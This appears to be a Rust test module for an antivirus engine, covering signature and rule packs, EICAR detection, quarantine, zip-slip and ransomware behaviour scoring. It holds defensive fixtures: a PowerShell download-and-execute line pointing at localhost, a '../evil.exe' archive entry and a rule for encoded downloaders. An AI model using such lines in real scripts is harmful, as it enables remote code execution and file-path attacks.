#[cfg(test)]
mod tests {
    use std::fs;

    use crate::analyzers::{analyze_path, FileType};
    use crate::behavior::{BehaviorDecision, FileActivityEvent};
    use crate::config::EngineConfig;
    use crate::engine::{sha256_bytes, PasusNativeEngine};
    use crate::heuristics;
    use crate::ml::NativeModelRunner;
    use crate::rules::RuleDb;
    use crate::scan::ScanActionMode;
    use crate::signatures::eicar_signature::EICAR_ASCII;
    use crate::signatures::{NativeSignature, SignatureDb, SignatureType};
    use crate::trust::Allowlist;
    use crate::verdict::{Confidence, ThreatCategory, Verdict};
    use chrono::Utc;

    fn test_engine() -> (tempfile::TempDir, PasusNativeEngine) {
        let dir = tempfile::tempdir().unwrap();
        let assets = dir.path().join("assets/pasus_native");
        fs::create_dir_all(assets.join("signatures")).unwrap();
        fs::create_dir_all(assets.join("rules")).unwrap();
        fs::create_dir_all(assets.join("ml")).unwrap();
        fs::create_dir_all(assets.join("trust")).unwrap();
        fs::write(
            assets.join("signatures/pasus_core.psig"),
            r#"{"format":"pasus-signature-pack-v1","version":"1","signatures":[]}"#,
        )
        .unwrap();
        fs::write(
            assets.join("rules/pasus_rules.prule"),
            r#"{"format":"pasus-rule-pack-v1","version":"1","rules":[{"id":"ps_encoded_download_exec","name":"Suspicious PowerShell encoded downloader execution","description":"Encoded PowerShell with download and execution indicators.","category":"suspiciousScript","confidence":"high","verdict":"probableMalware","false_positive_notes":"Admin scripts can contain encoded commands; this rule requires download and execution indicators.","conditions":[{"type":"file_type","equals":"powershell_script"},{"type":"encoded_command"},{"type":"downloader_and_execution"}],"min_condition_matches":3,"action":"review_or_block_by_policy"}]}"#,
        )
        .unwrap();
        fs::write(
            assets.join("ml/pasus_native_model.pmodel"),
            r#"{"model_name":"Pasus Native Development Model","model_version":"0.1.0-dev","model_format_version":"pmodel-v1","feature_schema_version":"pne-features-v1","production_ready":false,"precision":0.0,"recall":0.0,"false_positive_rate":1.0,"bias":-3.0,"weights":{"encoded_command_flag":2.5,"suspicious_string_count":1.5,"double_extension":1.3,"known_bad_flag":5.0},"thresholds":{"suspicious":0.65,"probable_malware":0.86,"confirmed_malware":0.98},"limitations":["Development fixture model; not production protection."]}"#,
        )
        .unwrap();
        let known_bad_hash = sha256_bytes(b"harmless-known-bad-fixture");
        fs::write(
            assets.join("trust/pasus_known_good.ptrust"),
            r#"{"hashes":[]}"#,
        )
        .unwrap();
        fs::write(
            assets.join("trust/pasus_known_bad_test.ptrust"),
            format!(r#"{{"hashes":["{known_bad_hash}"]}}"#),
        )
        .unwrap();
        let mut config = EngineConfig::from_repo_root(dir.path());
        config.quarantine_dir = dir.path().join("quarantine");
        let engine = PasusNativeEngine::initialize(config).unwrap();
        (dir, engine)
    }

    #[test]
    fn eicar_detected_by_native_signature() {
        let (_dir, mut engine) = test_engine();
        let verdict = engine
            .scan_bytes_for_test(
                std::path::PathBuf::from("eicar.txt"),
                EICAR_ASCII.as_bytes(),
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert_eq!(verdict.engine, "Pasus Native Engine");
        assert_eq!(verdict.final_verdict.verdict, Verdict::TestThreat);
    }

    #[test]
    fn normal_exe_in_downloads_is_not_malware() {
        let (dir, mut engine) = test_engine();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("expressvpn-windows-x64.exe");
        fs::write(&file, b"normal installer fixture").unwrap();
        let verdict = engine.scan_file(file, ScanActionMode::DetectOnly).unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Clean | Verdict::LikelyClean | Verdict::Observation
        ));
    }

    #[test]
    fn encoded_powershell_rule_returns_probable() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("dropper.ps1");
        fs::write(
            &file,
            b"powershell -EncodedCommand AAAA; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/a')",
        )
        .unwrap();
        let verdict = engine.scan_file(file, ScanActionMode::DetectOnly).unwrap();
        assert!(matches!(
            verdict.final_verdict.verdict,
            Verdict::Suspicious | Verdict::ProbableMalware
        ));
    }

    #[test]
    fn detect_only_never_quarantines() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("eicar-memory.txt");
        let verdict = engine
            .scan_bytes_for_test(
                file.clone(),
                EICAR_ASCII.as_bytes(),
                ScanActionMode::DetectOnly,
            )
            .unwrap();
        assert!(verdict.quarantine_record.is_none());
    }

    #[test]
    fn confirmed_mode_quarantines_eicar() {
        let (dir, mut engine) = test_engine();
        let file = dir.path().join("known_bad_fixture.bin");
        fs::write(&file, b"harmless-known-bad-fixture").unwrap();
        let verdict = engine
            .scan_file(file.clone(), ScanActionMode::AutoQuarantineConfirmed)
            .unwrap();
        assert!(verdict.quarantine_record.is_some());
        assert!(!file.exists());
    }

    #[test]
    fn signature_pack_loads_and_counts_builtin() {
        let (dir, _) = test_engine();
        let db = SignatureDb::load_pack(
            &dir.path()
                .join("assets/pasus_native/signatures/pasus_core.psig"),
        )
        .unwrap();
        assert!(db.count() >= 1);
    }

    #[test]
    fn rule_pack_loads() {
        let (dir, _) = test_engine();
        let db = RuleDb::load_pack(
            &dir.path()
                .join("assets/pasus_native/rules/pasus_rules.prule"),
        )
        .unwrap();
        assert_eq!(db.count(), 1);
    }

    #[test]
    fn pmodel_loads_and_is_development_only() {
        let (dir, _) = test_engine();
        let runner = NativeModelRunner::load(
            &dir.path()
                .join("assets/pasus_native/ml/pasus_native_model.pmodel"),
        )
        .unwrap();
        assert!(runner.is_loaded());
        assert!(!runner.production_ready());
    }

    #[test]
    fn archive_zip_slip_is_detected_by_analyzer() {
        let file = std::path::Path::new("sample.zip");
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"PK\x03\x04");
        bytes.extend_from_slice(&[0; 22]);
        let name = b"../evil.exe";
        bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(name);
        let analysis = analyze_path(file, &bytes).unwrap();
        assert_eq!(analysis.file_type, FileType::Zip);
        assert!(analysis.archive.unwrap().zip_slip_blocked);
    }

    #[test]
    fn allowlist_blocks_root_paths() {
        assert!(!Allowlist::validate_path("C:\\"));
        assert!(!Allowlist::validate_path("/"));
        assert!(Allowlist::validate_path("C:\\Users\\Brent\\Downloads"));
    }

    #[test]
    fn double_extension_increases_score() {
        let path = std::path::Path::new("invoice.pdf.exe");
        assert!(heuristics::filename::filename_risk(path) >= 25);
    }

    #[test]
    fn self_test_detects_eicar() {
        let (_, mut engine) = test_engine();
        let report = engine.engine_self_test().unwrap();
        assert!(report.eicar_detected);
        assert_eq!(report.overall_result, "pass");
    }

    #[test]
    fn compiler_rejects_broad_confirmed_string_signature() {
        let signature = NativeSignature {
            id: "PNE-BROAD-BAD".to_string(),
            name: "Broad bad signature".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::Unknown,
            confidence: Confidence::Confirmed,
            severity: "high".to_string(),
            signature_type: SignatureType::AsciiString,
            pattern: "cmd".to_string(),
            mask: None,
            offset: None,
            file_types: vec!["text".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "This intentionally broad fixture must be rejected.".to_string(),
            action_policy: "quarantine_if_policy_allows".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        assert!(crate::signatures::signature_compiler::validate_signatures(&[signature]).is_err());
    }

    #[test]
    fn compiler_outputs_pack_metadata_and_hash() {
        let signature = NativeSignature {
            id: "PNE-HASH-TEST".to_string(),
            name: "Hash test signature".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::TestThreat,
            confidence: Confidence::Confirmed,
            severity: "test".to_string(),
            signature_type: SignatureType::ExactHash,
            pattern: sha256_bytes(b"fixture").to_string(),
            mask: None,
            offset: None,
            file_types: vec!["*".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "Safe compiler test fixture.".to_string(),
            action_policy: "quarantine_if_policy_allows".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        let (pack, metadata) = crate::signatures::signature_compiler::compile_pack(
            vec![signature],
            "9.9.9".to_string(),
        )
        .unwrap();
        assert_eq!(pack.signatures.len(), 1);
        assert_eq!(metadata.signature_count, 1);
        assert!(pack.pack_sha256.is_some());
        assert_eq!(
            pack.pack_sha256.as_deref(),
            Some(metadata.pack_sha256.as_str())
        );
    }

    #[test]
    fn byte_pattern_offset_and_file_type_filter_are_enforced() {
        let signature = NativeSignature {
            id: "PNE-OFFSET-TEST".to_string(),
            name: "Offset byte pattern".to_string(),
            version: "1".to_string(),
            category: ThreatCategory::Unknown,
            confidence: Confidence::Low,
            severity: "low".to_string(),
            signature_type: SignatureType::BytePattern,
            pattern: "DE AD BE EF".to_string(),
            mask: None,
            offset: Some(4),
            file_types: vec!["text".to_string()],
            min_file_size: None,
            max_file_size: None,
            required_context: vec![],
            false_positive_notes: "Offset matcher test fixture.".to_string(),
            action_policy: "review_only".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };
        let bytes = b"xxxx\xde\xad\xbe\xef";
        let analysis = analyze_path(std::path::Path::new("sample.txt"), bytes).unwrap();
        assert!(crate::signatures::signature_matcher::matches_signature(
            &signature,
            std::path::Path::new("sample.txt"),
            &sha256_bytes(bytes),
            bytes,
            &analysis
        )
        .is_some());

        let pe_analysis = analyze_path(
            std::path::Path::new("sample.exe"),
            b"MZxxxx\xde\xad\xbe\xef",
        )
        .unwrap();
        assert!(crate::signatures::signature_matcher::matches_signature(
            &signature,
            std::path::Path::new("sample.exe"),
            &sha256_bytes(b"MZxxxx\xde\xad\xbe\xef"),
            b"MZxxxx\xde\xad\xbe\xef",
            &pe_analysis
        )
        .is_none());
    }

    #[test]
    fn ransomware_activity_window_accumulates_process_behavior() {
        let (dir, mut engine) = test_engine();
        let process = dir.path().join("unknown.exe");
        fs::write(&process, b"harmless simulator").unwrap();
        let mut decision = BehaviorDecision::Allow;
        for index in 0..5 {
            decision = engine
                .analyze_file_activity(FileActivityEvent {
                    process_id: 777,
                    process_path: process.clone(),
                    affected_paths: vec![dir.path().join(format!("doc-{index}.txt"))],
                    files_modified_count: 6,
                    files_renamed_count: 4,
                    entropy_increase_count: 3,
                    ransom_note_created: index == 4,
                    backup_tamper_attempt: false,
                })
                .unwrap();
        }
        assert_eq!(decision, BehaviorDecision::StopProcess);
    }
}
